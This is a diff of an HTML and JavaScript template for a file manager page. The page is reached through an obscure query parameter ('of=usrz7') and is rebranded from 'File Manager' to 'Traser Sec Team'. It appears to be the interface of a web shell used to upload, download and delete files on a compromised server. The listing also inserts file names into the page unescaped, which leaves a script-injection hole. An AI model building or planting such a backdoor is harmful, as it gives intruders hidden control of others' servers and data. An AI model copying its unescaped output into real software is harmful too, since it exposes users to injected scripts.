@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>File Manager</title>
+<title>Traser Sec Team</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
 body{margin:0;padding:20px;font-family:Inter,sans-serif;background:#fff;color:#0f172a}
@@ -15,6 +15,7 @@ body{margin:0;padding:20px;font-family:Inter,sans-serif;background:#fff;color:#0
 .actions button{background:#ffeef0;border-color:#fbb6c2;color:#b91c1c}
 .breadcrumb{margin-bottom:12px;font-size:14px;color:#6b7280}
 input[type=file]{display:none}
+.notice{margin-top:10px;color:#b91c1c}
 </style>
 </head>
 <body>
@@ -22,40 +23,39 @@ input[type=file]{display:none}
 <div class="breadcrumb">
 <a href="?of=usrz7&dir={{parentDir}}">../</a> {{currentDir}}
 </div>
+
 <div>
-<label class="button" id="filebtn">Pilih File</label>
-<input type="file" id="fileinput">
-<button class="button" onclick="uploadFile()">Upload</button>
+<form method="post" enctype="multipart/form-data">
+  <label class="button" for="fileinput">Pilih File</label>
+  <input type="file" id="fileinput" name="file" required>
+  <input type="hidden" name="csrf" value="{{csrf}}">
+  <input type="hidden" name="action" value="upload">
+  <button type="submit" class="button">Upload</button>
+</form>
+<div class="notice">{{opmsg}}</div>
 </div>
-<div class="list" id="filelist"></div>
-<div id="msg" style="margin-top:12px;color:#b91c1c"></div>
+
+<div class="list">
+<div id="filelist"></div>
 </div>
+
 <script>
 const FILES=JSON.parse('{{filelist}}');
-const CSRF='{{csrf}}';
 const currentDir='{{currentDir}}';
-const BASE_URL=location.pathname+'?of=usrz7'+(currentDir?('&dir='+currentDir):'');
 const listEl=document.getElementById('filelist');
-document.getElementById('filebtn').onclick=_=>document.getElementById('fileinput').click();
-document.getElementById('fileinput').onchange=_=>{
-  if(!document.getElementById('fileinput').files.length)return;
-  document.getElementById('filebtn').textContent=document.getElementById('fileinput').files[0].name;
-}
 function renderList(){
   listEl.innerHTML=FILES.map(f=>`<div class="item">
   <span>${f}</span>
   <span class="actions">
     <a href="download.php?file=${encodeURIComponent(f)}&dir=${currentDir}">Download</a>
-    <form method="post" style="display:inline"><input type="hidden" name="file" value="${f}">
-    <input type="hidden" name="csrf" value="${CSRF}"><input type="hidden" name="action" value="delete">
-    <button type="submit">Delete</button></form>
+    <form method="post" style="display:inline">
+      <input type="hidden" name="file" value="${f}">
+      <input type="hidden" name="csrf" value="{{csrf}}">
+      <input type="hidden" name="action" value="delete">
+      <button type="submit">Delete</button>
+    </form>
   </span>
   </div>`).join('');
-}
-function uploadFile(){
-  const f=document.getElementById('fileinput').files[0];if(!f)return;
-  const fd=new FormData();fd.append('file',f);fd.append('csrf',CSRF);fd.append('action','upload');
-  fetch(BASE_URL,{method:'POST',body:fd}).then(r=>r.text()).then(_=>location.reload());
 }
 renderList();
 </script>
